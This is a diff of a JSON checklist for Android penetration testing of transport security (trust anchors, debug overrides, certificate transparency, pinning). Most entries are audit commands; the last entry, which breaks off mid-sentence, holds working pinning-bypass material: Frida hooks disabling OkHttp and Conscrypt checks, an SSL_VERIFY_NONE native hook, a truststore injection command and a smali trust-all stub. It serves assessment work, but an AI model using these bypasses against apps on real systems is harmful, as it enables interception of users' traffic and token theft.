+   "how": "```bash\ntshark -r cap.pcap -q -z conv,tcp | sort -k2 | head -40\ntshark -r cap.pcap -Y 'quic || mqtt || websocket || xmpp' \\\n  -T fields -e ip.dst -e tcp.dstport -e udp.dstport | sort -u\ngrep -rn -i 'mqtt\\|xmpp\\|Socket(\\|SSLSocketFactory\\|grpc\\|QuicChannel\\|cronet\\|newWebSocket' $DEC/jadx/sources/\n# relay a non-HTTP TLS protocol through your proxy:\n#   MITM Relay (MASTG-TOOL-0078) in front of the app's target host:port\n```",
    "proof": "A conversation in the pcap to a port the proxy never saw, named with host, port and\nprotocol, and the payload shown. Then rate what is inside it.",
    "escalation": "Whatever the channel carries. Force the app onto your visible harness by blocking\nUDP/443 at the AP and, if the app has an alternate port, blocking that too — and **state in the report\nthat you did this**, because the fallback behaviour is itself a finding.",
    "ruled_out_when": "Every TCP/UDP conversation in the pcap is accounted for by an intercepted flow, and\nthe app's only non-443 destinations are DNS and NTP."
@@ -1223,8 +1265,10 @@
     "AM-09"
    ],
    "applies_to": "all",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "mitm",
+   "requires_tags": [
+    "mitm"
+   ],
    "maps_to": "CWE-319; corpus community sources sec-14-4 #9, sec-14-18 #23",
    "record": "",
    "legacy_meta": {},
@@ -1250,7 +1294,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Tokens, OTPs, PANs and PII in the query string land in server logs, proxy logs, CDN logs and\n`Referer` headers on any outbound link. TLS does not help against any of those holders.",
-   "how": "```bash\ngrep -rn 'HttpUrl.Builder\\|addQueryParameter\\|Uri.Builder\\|appendQueryParameter\\|buildUpon' jadx_out/sources/ \\\n  | grep -iE 'token|otp|pass|card|ssn|email|session|auth|key'\n# Burp: filter HTTP history by query string, then sort by parameter name\n```",
+   "how": "```bash\ngrep -rn 'HttpUrl.Builder\\|addQueryParameter\\|Uri.Builder\\|appendQueryParameter\\|buildUpon' $DEC/jadx/sources/ \\\n  | grep -iE 'token|otp|pass|card|ssn|email|session|auth|key'\n# Burp: filter HTTP history by query string, then sort by parameter name\n```",
    "proof": "A request line containing `?access_token=…`, `?otp=…` or an account identifier — and, for\nthe strong version, the same value reappearing in a `Referer` header on a request to a third-party\nhost.",
    "escalation": "→ D20 where the third-party recipient is an analytics processor the user never\nconsented to; → D13 if the leaked value is a bearer credential.",
    "ruled_out_when": "No credential-class parameter appears in any request line across a full feature\nwalk, and no outbound third-party request carries a first-party `Referer` containing one."
@@ -1270,8 +1314,10 @@
     "AM-06"
    ],
    "applies_to": "`targetSdk ≥ 24`, where this is an explicit opt-in. **LEGACY:** at `targetSdk < 24` user CAs are trusted with no config at all and this is the platform default, not a misconfiguration",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "targetsdk>=24",
+   "requires_tags": [
+    "targetsdk>=24"
+   ],
    "maps_to": "MASTG-TEST-0286, MASWE-0027, MASTG-KNOW-0014, semgrep rule `mastg-android-network-insecure-trust-anchors` (literally `match: any: - <certificates src=\"user\"`), MASTG-TOOL-0110, MobSF `network_security.py` \"Base config is configured to trust user installed certificates\" (HIGH), ATT&CK T1632 Subvert Trust Controls",
    "record": "",
    "legacy_meta": {},
@@ -1305,7 +1351,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "An app that re-enables user-CA trust voluntarily reverses a platform hardening and makes\ninterception possible with **no root and no instrumentation**, which widens the realistic attacker\npopulation enormously.",
-   "how": "```bash\ngrep -n -A6 '<trust-anchors>' apktool_out/res/xml/network_security_config.xml\nyq -p=xml -o=json -r '.network-security-config.\"base-config\".\"trust-anchors\".certificates[].\"+@src\"' \\\n   apktool_out/res/xml/network_security_config.xml\nsemgrep -c rules/mastg-android-network-insecure-trust-anchors.yml apktool_out/res/xml/network_security_config.xml\ngrep -n 'debug-overrides' apktool_out/res/xml/network_security_config.xml   # distinguish scope\n```\nExpected semgrep output shape:\n```\n    network_security_config.xml\n    ❯❱ rules.mastg-android-network-insecure-trust-anchors\n            6┆ <certificates src=\"user\" />\n```",
+   "how": "```bash\ngrep -n -A6 '<trust-anchors>' $DEC/apktool/res/xml/network_security_config.xml\nyq -p=xml -o=json -r '.network-security-config.\"base-config\".\"trust-anchors\".certificates[].\"+@src\"' \\\n   $DEC/apktool/res/xml/network_security_config.xml\nsemgrep -c rules/mastg-android-network-insecure-trust-anchors.yml $DEC/apktool/res/xml/network_security_config.xml\ngrep -n 'debug-overrides' $DEC/apktool/res/xml/network_security_config.xml   # distinguish scope\n```\nExpected semgrep output shape:\n```\n    network_security_config.xml\n    ❯❱ rules.mastg-android-network-insecure-trust-anchors\n            6┆ <certificates src=\"user\" />\n```",
    "proof": "The `<certificates src=\"user\"/>` element inside `<trust-anchors>` **outside** any\n`<debug-overrides>` block, in the release APK pulled from Play, plus full request/response interception\nusing only a **user-store** CA on a stock, non-rooted device — no Frida, no patched APK, no root.\nThat combination is the reportable condition.",
    "escalation": "Full traffic control → token theft (D13), response tampering (D15), injected content\ninto a WebView (D10). Pair with a phishing flow that induces the CA install to make the attacker path\nconcrete.",
    "ruled_out_when": "`targetSdk ≥ 24` and no `src=\"user\"` appears outside `<debug-overrides>`, and a\nuser-store CA install produces TLS failures for every first-party host on a stock device."
@@ -1325,8 +1371,11 @@
     "AM-06"
    ],
    "applies_to": "**LEGACY** — only when `minSdkVersion < 24`; state the affected device share in the report",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "minsdk<24, legacy",
+   "requires_tags": [
+    "minsdk<24",
+    "legacy"
+   ],
    "maps_to": "MASTG-TEST-0285 (note its frontmatter carries `deprecated_since: 24`), MASWE-0027, MASTG-KNOW-0014, MASTG-TECH-0150, ATT&CK T1632 (\"apps that target compatibility with Android 7 and higher (API Level 24) default to only trusting CA certificates that are bundled with the operating system\")",
    "record": "",
    "legacy_meta": {},
@@ -1406,7 +1455,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "A release APK containing debug overrides is normally inert and **informational only**. It\nbecomes a shipped MitM backdoor when the same build is debuggable: pinning and the trust store are both\nswitched off for anyone who can install a certificate or attach a debugger.",
-   "how": "```bash\naapt2 dump badging base.apk | grep -i debuggable\ngrep -n 'android:debuggable' apktool_out/AndroidManifest.xml\nsed -n '/<debug-overrides>/,/<\\/debug-overrides>/p' apktool_out/res/xml/network_security_config.xml\ngrep -rn 'overridePins' apktool_out/res/xml/\nadb shell dumpsys package <pkg> | grep -i DEBUGGABLE     # confirm on the INSTALLED store build\n```",
+   "how": "```bash\naapt2 dump badging base.apk | grep -i debuggable\ngrep -n 'android:debuggable' $DEC/apktool/AndroidManifest.xml\nsed -n '/<debug-overrides>/,/<\\/debug-overrides>/p' $DEC/apktool/res/xml/network_security_config.xml\ngrep -rn 'overridePins' $DEC/apktool/res/xml/\nadb shell dumpsys package <pkg> | grep -i DEBUGGABLE     # confirm on the INSTALLED store build\n```",
    "proof": "`application-debuggable` in `aapt2 dump badging` **and** a\n`<debug-overrides><trust-anchors><certificates src=\"user\"/>` block, **and** an end-to-end MitM using\nonly a user-store CA with no root. Confirm the debuggable flag on the build installed from the store,\nnot on your own rebuild.",
    "escalation": "Debuggable also gives JDWP → arbitrary code in the app's UID → token theft with no\nnetwork position at all (→ D02, D26). File the two primitives separately and cross-reference; one fix\nequals one bounty.",
    "ruled_out_when": "`aapt2 dump badging` shows no `application-debuggable` on the store build — the\n`<debug-overrides>` block is then inert and belongs in the graveyard table, not the findings list."
@@ -1426,8 +1475,10 @@
     "AM-06"
    ],
    "applies_to": "NSC apps, API 24+. `overridePins` defaults to `false` everywhere **except** inside `<debug-overrides>`, where it defaults to `true`",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "targetsdk>=24",
+   "requires_tags": [
+    "targetsdk>=24"
+   ],
    "maps_to": "Android NSC reference (`<debug-overrides>`, `overridePins`, `<certificates src>`), MASWE-0028, MobSF \"Base config is configured to bypass certificate pinning\" (HIGH)",
    "record": "",
    "legacy_meta": {},
@@ -1451,7 +1502,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "`<certificates src=\"user\" overridePins=\"true\"/>` in `base-config` or a production\n`domain-config` means any user-installed CA defeats the app's own pin set. The app appears pinned in\ncode review and is not pinned in practice.",
-   "how": "```bash\ngrep -nE 'overridePins|src=\"user\"|src=\"system\"|src=\"@raw' apktool_out/res/xml/network_security_config.xml\npython3 - <<'PY'\nimport glob, xml.dom.minidom as m\nfor f in glob.glob('apktool_out/res/xml/*.xml'):\n    try: d=m.parse(f)\n    except Exception: continue\n    for c in d.getElementsByTagName('certificates'):\n        p=c.parentNode.parentNode.nodeName\n        print(p, 'src=', c.getAttribute('src'), 'overridePins=', c.getAttribute('overridePins') or 'false(default)')\nPY\n```",
+   "how": "```bash\ngrep -nE 'overridePins|src=\"user\"|src=\"system\"|src=\"@raw' $DEC/apktool/res/xml/network_security_config.xml\npython3 - <<'PY'\nimport glob, xml.dom.minidom as m\nfor f in glob.glob('$DEC/apktool/res/xml/*.xml'):\n    try: d=m.parse(f)\n    except Exception: continue\n    for c in d.getElementsByTagName('certificates'):\n        p=c.parentNode.parentNode.nodeName\n        print(p, 'src=', c.getAttribute('src'), 'overridePins=', c.getAttribute('overridePins') or 'false(default)')\nPY\n```",
    "proof": "Install your CA to the **user** store on a stock device, no root, no hooks — traffic to the\npinned domain decrypts. Show the pin set in the same XML to make the contradiction explicit.",
    "escalation": "→ D15. This is the shape that turns a P5 \"pinning present\" into a real transport\nfinding, because the control is declared and simultaneously disabled.",
    "ruled_out_when": "`overridePins` is absent or `false` everywhere outside `<debug-overrides>`, and a\nuser-store CA cannot intercept the pinned domain on a stock device."
@@ -1472,8 +1523,10 @@
     "AM-09"
    ],
    "applies_to": "NSC apps, API 24+. The CT caveat applies at every API level; CT itself is API 36+",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "targetsdk>=24",
+   "requires_tags": [
+    "targetsdk>=24"
+   ],
    "maps_to": "Android NSC reference — \"Certificate transparency verification is NOT performed on connections using custom trust anchors\"; MASWE-0028, MASWE-0027",
    "record": "",
    "legacy_meta": {},
@@ -1501,7 +1554,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "A bundled CA in `res/raw` replaces (not augments) the anchors for its scope. Two\nconsequences: the private CA's issuance practices become the app's trust boundary, and **CT\nverification is not performed at all on that connection** — so a mis-issued certificate under that\nanchor is undetectable even on an API 37 device where CT is default-on.",
-   "how": "```bash\ngrep -n 'src=\"@raw' apktool_out/res/xml/network_security_config.xml\nls apktool_out/res/raw/*.pem apktool_out/res/raw/*.crt apktool_out/res/raw/*.cer 2>/dev/null\nfor c in apktool_out/res/raw/*.{pem,crt,cer}; do [ -f \"$c\" ] && \\\n  openssl x509 -in \"$c\" -noout -subject -issuer -dates -text | grep -E 'Subject:|Issuer:|Not After|DNS:'; done\n```",
+   "how": "```bash\ngrep -n 'src=\"@raw' $DEC/apktool/res/xml/network_security_config.xml\nls $DEC/apktool/res/raw/*.pem $DEC/apktool/res/raw/*.crt $DEC/apktool/res/raw/*.cer 2>/dev/null\nfor c in $DEC/apktool/res/raw/*.{pem,crt,cer}; do [ -f \"$c\" ] && \\\n  openssl x509 -in \"$c\" -noout -subject -issuer -dates -text | grep -E 'Subject:|Issuer:|Not After|DNS:'; done\n```",
    "proof": "The `src=\"@raw/…\"` stanza, the certificate's Subject/Issuer/validity, and the domains it is\nscoped to. If the anchor has already expired, the scoped domains fail closed — capture that too, it is\nan availability finding the vendor will care about.",
    "escalation": "The bundled certificate's SANs frequently name internal hosts (→ D14-039, → D01). The\nCT gap pairs with D14-031 into one \"mis-issuance would be undetectable\" finding.",
    "ruled_out_when": "No `src=\"@raw\"` anchor exists, or the anchor is scoped only to a non-production\ndomain and the production `domain-config` uses `src=\"system\"` with CT enabled."
@@ -1521,8 +1574,10 @@
     "AM-06"
    ],
    "applies_to": "`<certificateTransparency enabled>` is **not available ≤ API 35**, available and **disabled by default on API 36**, **enabled by default with opt-out at API 37+**",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "targetsdk>=36",
+   "requires_tags": [
+    "targetsdk>=36"
+   ],
    "maps_to": "Android NSC reference (`<certificateTransparency enabled>` and its per-API defaults; the custom-trust-anchor exclusion)",
    "record": "",
    "legacy_meta": {},
@@ -1545,7 +1600,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "A `domain-config` that sets `enabled=\"false\"` for a sensitive domain is a deliberate removal\nof CT enforcement. Combined with no pin set, a single rogue or compromised CA is then sufficient to\nMitM with nothing to detect it after the fact.",
-   "how": "```bash\ngrep -nE 'certificateTransparency|<certificates src=|overridePins|domainEncryption' apktool_out/res/xml/*.xml\ngrep -n 'networkSecurityConfig' apktool_out/AndroidManifest.xml\naapt2 dump badging base.apk | grep targetSdkVersion\n```",
+   "how": "```bash\ngrep -nE 'certificateTransparency|<certificates src=|overridePins|domainEncryption' $DEC/apktool/res/xml/*.xml\ngrep -n 'networkSecurityConfig' $DEC/apktool/AndroidManifest.xml\naapt2 dump badging base.apk | grep targetSdkVersion\n```",
    "proof": "`<certificateTransparency enabled=\"false\"/>` scoped to the API or auth domain, **or** a\ncustom trust anchor for that domain (which disables CT regardless), together with the absence of a\n`<pin-set>` for the same domain.",
    "escalation": "→ D14-034. Report the pair: no pinning *and* no CT on the auth domain is a genuinely\nweaker posture than either alone, and it is the honest way to give a P5 pinning observation weight.",
    "ruled_out_when": "`targetSdk ≤ 35` (the attribute does not exist, so there is nothing to opt out of\n— say so rather than calling it missing), or no `enabled=\"false\"` appears and the production domain\nuses system anchors."
@@ -1565,8 +1620,10 @@
     "AM-06"
    ],
    "applies_to": "`<domainEncryption mode>` defaults to **enabled at API 37+**, disabled at 36 and below",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "targetsdk>=36",
+   "requires_tags": [
+    "targetsdk>=36"
+   ],
    "maps_to": "Android NSC reference (`<domainEncryption mode>` and its per-API defaults)",
    "record": "",
    "legacy_meta": {},
@@ -1588,7 +1645,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "An app that pre-emptively sets `mode=\"disabled\"` on its API domain opts out of SNI\nencryption, leaving the destination hostname visible on the wire.",
-   "how": "```bash\ngrep -n 'domainEncryption' apktool_out/res/xml/*.xml\ntshark -r cap.pcap -Y 'tls.handshake.type==1' -T fields -e tls.handshake.extensions_server_name | sort -u\n```",
+   "how": "```bash\ngrep -n 'domainEncryption' $DEC/apktool/res/xml/*.xml\ntshark -r cap.pcap -Y 'tls.handshake.type==1' -T fields -e tls.handshake.extensions_server_name | sort -u\n```",
    "proof": "The `mode=\"disabled\"` stanza scoped to a first-party domain, plus the plaintext SNI values\nin the ClientHello capture.",
    "escalation": "→ D20 traffic-analysis privacy. Report it only where the hostname itself discloses\nsomething — health, dating, whistleblowing, political, HIV/addiction services — otherwise it is noise.",
    "ruled_out_when": "No `domainEncryption` element exists (the API 37+ default applies) or `targetSdk`\nis below 37 so the attribute is inert."
@@ -1608,8 +1665,12 @@
     "AM-12"
    ],
    "applies_to": "API 34+, apps that enumerate or hash the system trust store to detect interception",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "api>=34, root, frida",
+   "requires_tags": [
+    "api>=34",
+    "root",
+    "frida"
+   ],
    "maps_to": "AOSP Conscrypt module (`source.android.com/docs/core/ota/modular-system/conscrypt` — \"Android 14 introduced updatable root certificates… stored in the Conscrypt module APEX and the system partition\"; paths `/apex/com.android.conscrypt/cacerts` and `/system/etc/security/cacerts`; APEX package `com.android.conscrypt`)",
    "record": "",
    "legacy_meta": {},
@@ -1631,7 +1692,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "An app that detects MitM by enumerating `/system/etc/security/cacerts` is reading a path the\nruntime ignores on API 34+. The check is bypassed by construction: install into the APEX path only and\nthe detector sees a clean store.",
-   "how": "```bash\ngrep -rn '/system/etc/security/cacerts\\|cacerts\\|KeyStore.getInstance(\"AndroidCAStore\")\\|TrustedCertificateStore' jadx_out/sources/\nadb shell ls /system/etc/security/cacerts | wc -l\nadb shell ls /apex/com.android.conscrypt/cacerts | wc -l\nfrida-trace -U -f <pkg> -j '*!*cacert*' -j '*!*TrustedCertificate*'\n```",
+   "how": "```bash\ngrep -rn '/system/etc/security/cacerts\\|cacerts\\|KeyStore.getInstance(\"AndroidCAStore\")\\|TrustedCertificateStore' $DEC/jadx/sources/\nadb shell ls /system/etc/security/cacerts | wc -l\nadb shell ls /apex/com.android.conscrypt/cacerts | wc -l\nfrida-trace -U -f <pkg> -j '*!*cacert*' -j '*!*TrustedCertificate*'\n```",
    "proof": "A Frida trace showing the app stat-ing or listing only `/system/etc/security/cacerts`,\nwhile interception succeeds through the APEX path.",
    "escalation": "Enables your own harness (→ D26). It is **not** a reportable finding on its own — it\nis a resilience observation and belongs in the graveyard unless the client's scope explicitly buys\nMAS-R controls.",
    "ruled_out_when": "The app performs no trust-store enumeration at all, or it reads\n`/apex/com.android.conscrypt/cacerts` (or uses `TrustedCertificateStore`/`AndroidCAStore`, which\nresolve correctly on every level)."
@@ -1687,7 +1748,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Build a host-by-host table: pinned / unpinned / bypassed-with-which-hook, and the mechanism\n(NSC `<pin-set>`, OkHttp `CertificatePinner`, TrustKit, Cronet `setPublicKeyPins`, a custom\n`TrustManager`, native BoringSSL). MASTG-TEST-0242 and -0244 both insist the finding applies **only to\nfirst-party domains under the developer's control** — do not report an unpinned third-party CDN.",
-   "how": "```bash\nyq -p=xml -o=json '.' apktool_out/res/xml/network_security_config.xml > nsc.json\njq -r '.[\"network-security-config\"][\"domain-config\"][]\n       | select(.[\"pin-set\"] != null)\n       | .domain | if type == \"object\" then .[\"+content\"] else . end' nsc.json\ngrep -rn 'CertificatePinner\\|certificatePinner(\\|sha256/\\|pinnedCertificates\\|TrustKit\\|setPublicKeyPins\\|X509TrustManagerExtensions' jadx_out/sources/\nrabin2 -zz lib/*/*.so | grep -iE 'sha256/|pinning|pin_set'\n# static mapper that prints file:line per implementation\npython sslpindetect.py -a apktool_2.11.0.jar -f base.apk -v\n```\nRuntime, implementation-agnostic (MASTG-TEST-0244): with the system CA correctly installed per\nD14-002, see which hosts still fail and correlate with the logcat marker from D14-003.",
+   "how": "```bash\nyq -p=xml -o=json '.' $DEC/apktool/res/xml/network_security_config.xml > nsc.json\njq -r '.[\"network-security-config\"][\"domain-config\"][]\n       | select(.[\"pin-set\"] != null)\n       | .domain | if type == \"object\" then .[\"+content\"] else . end' nsc.json\ngrep -rn 'CertificatePinner\\|certificatePinner(\\|sha256/\\|pinnedCertificates\\|TrustKit\\|setPublicKeyPins\\|X509TrustManagerExtensions' $DEC/jadx/sources/\nrabin2 -zz lib/*/*.so | grep -iE 'sha256/|pinning|pin_set'\n# static mapper that prints file:line per implementation\npython sslpindetect.py -a apktool_2.11.0.jar -f base.apk -v\n```\nRuntime, implementation-agnostic (MASTG-TEST-0244): with the system CA correctly installed per\nD14-002, see which hosts still fail and correlate with the logcat marker from D14-003.",
    "proof": "The table. For each pinned host: the `<pin-set>` or `CertificatePinner` call site and the\n`I/X509Util: … Pin verification failed` line. For each unpinned host: the decrypted flow.",
    "escalation": "Two things in this table are worth money and nothing else is: an **expired** pin set\n(→ D14-035) and an **unpinned host that carries user identifiers or auth material** (→ D14-036).\nEverything else is context for D15.",
    "ruled_out_when": "Not applicable as a negative — this item always produces an inventory. What is\nruled out is the *finding*: \"pinning absent on first-party hosts, no interceptable secret found,\nno realistic AM-06 path\" goes to the ruled-out register, never to the report."
@@ -1707,8 +1768,10 @@
     "AM-06"
    ],
    "applies_to": "all NSC-pinning apps, API 24+",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "targetsdk>=24",
+   "requires_tags": [
+    "targetsdk>=24"
+   ],
    "maps_to": "MASTG-TEST-0243, MASWE-0028, MASTG-KNOW-0014, MASTG-KNOW-0015; MobSF `network_security.py` \"Certificate pinning expires on {exp}. After this date pinning will be disabled.\"",
    "record": "",
    "legacy_meta": {},
@@ -1734,7 +1797,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Once past the `expiration` date Android **stops enforcing that pin set** and falls back to\nthe configured trust anchors. MASTG notes the behaviour is deliberate, \"to prevent connectivity issues\nin apps which do not get updates to their pin set\" — which is exactly why the developer believes\npinning is still on when it is not.",
-   "how": "```bash\nyq -p=xml -o=json '.' apktool_out/res/xml/network_security_config.xml | \\\n  jq -r '.[\"network-security-config\"][\"domain-config\"][]? | {domain, exp: .[\"pin-set\"][\"+@expiration\"]}'\ndate -u +%Y-%m-%d\n```\nMobSF's own convention is useful framing: a `pin-set` with **no** expiration is the secure case; one\n**with** an expiration is at best informational and, once past, is effectively unpinned.",
+   "how": "```bash\nyq -p=xml -o=json '.' $DEC/apktool/res/xml/network_security_config.xml | \\\n  jq -r '.[\"network-security-config\"][\"domain-config\"][]? | {domain, exp: .[\"pin-set\"][\"+@expiration\"]}'\ndate -u +%Y-%m-%d\n```\nMobSF's own convention is useful framing: a `pin-set` with **no** expiration is the secure case; one\n**with** an expiration is at best informational and, once past, is effectively unpinned.",
    "proof": "An `expiration` date in the past on a first-party `<domain-config>`, plus successful\ninterception of that exact domain on a device whose clock is current — the pair is what distinguishes\nthis from an ordinary P5 pinning note.",
    "escalation": "Same as missing pinning, but with a stronger narrative: the control is declared,\nbudgeted and believed-in, and it lapsed. That framing is what gets a P5 read at P4/P3 on some programs.",
    "ruled_out_when": "Every `<pin-set>` either has no `expiration` attribute or a future-dated one —\nrecord the dates, because a pin set expiring inside the client's release cadence is worth a sentence."
@@ -1754,8 +1817,10 @@
     "AM-06"
    ],
    "applies_to": "all apps that pin selectively — which is nearly all of them",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "mitm",
+   "requires_tags": [
+    "mitm"
+   ],
    "maps_to": "MASTG-TEST-0242's first-party scoping rule, MASWE-0028; corpus worked calibration: a payment SDK pinning **its own** traffic while the app's main API was interceptable with a system-trusted CA",
    "record": "",
    "legacy_meta": {},
@@ -1806,8 +1871,14 @@
     "AM-06"
    ],
    "applies_to": "apps bundling a native HTTP client (`libcurl`, BoringSSL, mbedTLS, nghttp2), Cronet, gRPC, or a cross-platform stack",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "native, flutter, unity, kmp, mitm",
+   "requires_tags": [
+    "native",
+    "flutter",
+    "unity",
+    "kmp",
+    "mitm"
+   ],
    "maps_to": "MASWE-0028; the NSC's documented scope (framework traffic only — not native-code connections)",
    "record": "",
    "legacy_meta": {},
@@ -1833,7 +1904,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "The app declares pins in the NSC or with `CertificatePinner`, but an SDK uses its own socket\nlayer that consults neither. The vendor believes the whole app is pinned; in practice an entire class\nof traffic is not.",
-   "how": "```bash\nunzip -o base.apk 'lib/*' -d x\nfor so in x/lib/*/*.so; do strings -a \"$so\" | grep -aqiE 'libcurl|boringssl|mbedtls|nghttp2|cronet' \\\n  && echo \"NATIVE HTTP: $so\"; done\ngrep -rn 'CertificatePinner\\|pin-set\\|certificateTransparency' jadx_out/sources/ apktool_out/res/xml/ \\\n  | grep -viE '^(jadx_out/sources/(android|androidx))/'\n# then: system CA installed, Java-layer unpinning ONLY, and see which hosts still appear\nfrida -U -f <pkg> --codeshare akabe1/frida-multiple-unpinning\n```",
+   "how": "```bash\nunzip -o base.apk 'lib/*' -d x\nfor so in x/lib/*/*.so; do strings -a \"$so\" | grep -aqiE 'libcurl|boringssl|mbedtls|nghttp2|cronet' \\\n  && echo \"NATIVE HTTP: $so\"; done\ngrep -rn 'CertificatePinner\\|pin-set\\|certificateTransparency' $DEC/jadx/sources/ $DEC/apktool/res/xml/ \\\n  | grep -viE '^($DEC/jadx/sources/(android|androidx))/'\n# then: system CA installed, Java-layer unpinning ONLY, and see which hosts still appear\nfrida -D \"$SERIAL\" -f <pkg> --codeshare akabe1/frida-multiple-unpinning\n```",
    "proof": "Burp showing SDK traffic to a third-party host decrypted while the app's own API host stays\npinned — and better, that SDK traffic carrying a session or user identifier.",
    "escalation": "→ D20 (PII in the clear to a third party), → D15 (replayable identifiers), → D19 for\nthe cross-platform variants.",
    "ruled_out_when": "No native HTTP library ships in `lib/`, or the native stack's destinations are all\npresent in the pin set and fail closed under interception."
@@ -1854,8 +1925,12 @@
     "AM-12"
    ],
    "applies_to": "all pinned apps",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "mitm, root, frida",
+   "requires_tags": [
+    "mitm",
+    "root",
+    "frida"
+   ],
    "maps_to": "MASTG-TECH-0012, MASTG-TOOL-0140 (frida-multiple-unpinning), MASTG-TOOL-0038/-0029 (objection), MASTG-TOOL-0025 (SSLUnpinning), MASTG-TOOL-0020 (JustTrustMe), MASTG-TOOL-0008 (Android-SSL-TrustKiller), MASTG-TOOL-0100 (reFlutter), MASTG-TOOL-0101 (disable-flutter-tls-verification), MASTG-TOOL-0103 (uber-apk-signer), MASTG-TECH-0039",
    "record": "",
    "legacy_meta": {},
@@ -1889,7 +1964,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Work the ladder in order of effort, and **record which hook fired** — that names the pinning\nstack, which is the one genuinely useful output of this item.\n```\n1  objection      android sslpinning disable\n2  Frida Java     akabe1/frida-multiple-unpinning  |  pcipolloni re-pinning to YOUR CA\n3  Frida native   SSL_CTX_set_custom_verify / ssl_verify_peer_cert  (BoringSSL, Cronet, Flutter, Go)\n4  Framework      reFlutter; Xamarin dnSpy IL patch; RN dev-bundle\n5  Static         smali method-body replacement, then repack + re-sign\n6  Config         repack with a permissive NSC (no root needed)\n```",
-   "how": "```bash\nobjection -g <pkg> explore -s \"android sslpinning disable\"\nfrida -U -f <pkg> --codeshare akabe1/frida-multiple-unpinning --no-pause\nfrida -U -f <pkg> -l config.js -l native-connect-hook.js -l native-tls-hook.js \\\n  -l android-proxy-override.js -l android-system-certificate-injection.js \\\n  -l android-certificate-unpinning.js -l android-certificate-unpinning-fallback.js\n```\n```javascript\n// the two hooks that cover most Java stacks\nJava.perform(function () {\n  try { var P = Java.use('okhttp3.CertificatePinner');\n        P.check.overload('java.lang.String','java.util.List').implementation = function(){};\n        P.check$okhttp.implementation = function(){}; } catch(e){}\n  try { var T = Java.use('com.android.org.conscrypt.TrustManagerImpl');\n        T.checkTrustedRecursive.implementation = function(){ return Java.use('java.util.ArrayList').$new(); };\n        T.verifyChain.implementation = function(chain){ return chain; }; } catch(e){}\n  try { var C = Java.use('org.chromium.net.impl.CronetEngineBuilderImpl'); } catch(e){}\n});\n// native layer, when Java hooks change nothing\nvar cv = Module.findExportByName(null, 'SSL_CTX_set_custom_verify');\nif (cv) Interceptor.attach(cv, { onEnter: function (args) { args[1] = ptr(0); } });  // SSL_VERIFY_NONE\n```\nStatic fallbacks:\n```bash\ngrep -ri \"sha256\\|sha1\" ./smali                                   # pinned digests\nfind ./assets -type f \\( -iname \\*.cer -o -iname \\*.crt \\)        # embedded certs\nfind ./ -type f \\( -iname \\*.jks -o -iname \\*.bks \\)              # truststores\nkeytool -importcert -v -trustcacerts -file proxy.cer -alias aliascert \\\n  -keystore \"res/raw/truststore.bks\" \\\n  -provider org.bouncycastle.jce.provider.BouncyCastleProvider \\\n  -providerpath \"providerpath/bcprov-jdk15on-164.jar\" -storetype BKS -storepass <password>\ngrep -ri 'java/lang/String;\\[Ljava/lang/String;)L' ./             # obfuscated CertificatePinner.Builder.add\n```\n```smali\n.method public checkServerTrusted([Ljava/security/cert/X509Certificate;Ljava/lang/String;)V\n  .registers 2\n  return-void\n.end method\n```\n**mTLS caveat:** replace **only** the `TrustManager[]`, keep the original `KeyManager[]` — replacing\nboth stops the app sending its client certificate and the handshake still fails, which reads as\nunbypassable pinning.",
+   "how": "```bash\nobjection -g <pkg> explore -s \"android sslpinning disable\"\nfrida -D \"$SERIAL\" -f <pkg> --codeshare akabe1/frida-multiple-unpinning\nfrida -D \"$SERIAL\" -f <pkg> -l config.js -l native-connect-hook.js -l native-tls-hook.js \\\n  -l android-proxy-override.js -l android-system-certificate-injection.js \\\n  -l android-certificate-unpinning.js -l android-certificate-unpinning-fallback.js\n```\n```javascript\n// the two hooks that cover most Java stacks\nJava.perform(function () {\n  try { var P = Java.use('okhttp3.CertificatePinner');\n        P.check.overload('java.lang.String','java.util.List').implementation = function(){};\n        P.check$okhttp.implementation = function(){}; } catch(e){}\n  try { var T = Java.use('com.android.org.conscrypt.TrustManagerImpl');\n        T.checkTrustedRecursive.implementation = function(){ return Java.use('java.util.ArrayList').$new(); };\n        T.verifyChain.implementation = function(chain){ return chain; }; } catch(e){}\n  try { var C = Java.use('org.chromium.net.impl.CronetEngineBuilderImpl'); } catch(e){}\n});\n// native layer, when Java hooks change nothing\nvar cv = Module.findExportByName(null, 'SSL_CTX_set_custom_verify');\nif (cv) Interceptor.attach(cv, { onEnter: function (args) { args[1] = ptr(0); } });  // SSL_VERIFY_NONE\n```\nStatic fallbacks:\n```bash\ngrep -ri \"sha256\\|sha1\" ./smali                                   # pinned digests\nfind ./assets -type f \\( -iname \\*.cer -o -iname \\*.crt \\)        # embedded certs\nfind ./ -type f \\( -iname \\*.jks -o -iname \\*.bks \\)              # truststores\nkeytool -importcert -v -trustcacerts -file proxy.cer -alias aliascert \\\n  -keystore \"res/raw/truststore.bks\" \\\n  -provider org.bouncycastle.jce.provider.BouncyCastleProvider \\\n  -providerpath \"providerpath/bcprov-jdk15on-164.jar\" -storetype BKS -storepass <password>\ngrep -ri 'java/lang/String;\\[Ljava/lang/String;)L' ./             # obfuscated CertificatePinner.Builder.add\n```\n```smali\n.method public checkServerTrusted([Ljava/security/cert/X509Certificate;Ljava/lang/String;)V\n  .registers 2\n  return-void\n.end method\n```\n**mTLS caveat:** replace **only** the `TrustManager[]`, keep the original `KeyManager[]` — replacing\nboth stops the app 